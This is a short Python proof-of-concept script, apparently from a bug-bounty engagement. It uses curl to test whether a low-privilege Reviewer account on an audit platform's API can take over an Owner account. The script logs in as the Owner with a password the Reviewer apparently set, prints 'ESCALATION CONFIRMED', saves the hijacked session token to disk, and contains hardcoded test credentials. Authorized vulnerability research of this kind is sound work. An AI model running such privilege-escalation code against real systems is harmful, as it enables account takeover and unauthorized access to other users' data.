import json,subprocess,os
H=os.environ['H']; BB=os.environ['BB']
TR=open('/tmp/tok_Reviewer').read().strip()
def req(method,path,body=None,tok=None):
    cmd=['curl','-s','-m','40','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+(tok or TR),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
def login(email,pw):
    cmd=['curl','-s','-m','30','-o','/tmp/l','-w','%{http_code}','-X','POST',H+'/api/v1/users/login',
         '-H',BB,'-H','Content-Type: application/json','-d',json.dumps({"credentials":{"email":email,"password":pw}})]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/l',encoding='utf-8',errors='replace').read()
print("=== Reviewer token identity ===")
c,b=req('GET','/api/v1/users/me',tok=TR)
u=json.loads(b)['users'][0]
print(f"  {u['id']} {u['email']} role={u['role_id']}")
print("\n=== did the Reviewer's password write on Owner 231 actually land? ===")
c,b=login("golden-snow-4771@bugcrowdninja.com","Zx9!up47")
print(f"  login as Owner with Reviewer-set password -> {c}")
if c=='200':
    s=json.loads(b)['session']
    print(f"  *** ESCALATION CONFIRMED: Reviewer took over Owner ***")
    print(f"  session: id={s['id']} role={s['role_id']} token={s['token'][:30]}...")
    open('/tmp/tok_escalated_owner','w').write(s['token'])
else:
    print("  ",b[:200])
print("\n=== current Owner 231 state (email may have been changed) ===")
c,b=req('GET','/api/v1/users/231',tok=TR)
u=json.loads(b)['users'][0]
print(f"  email={u['email']!r} req_pw_change={u['requires_password_change']}")
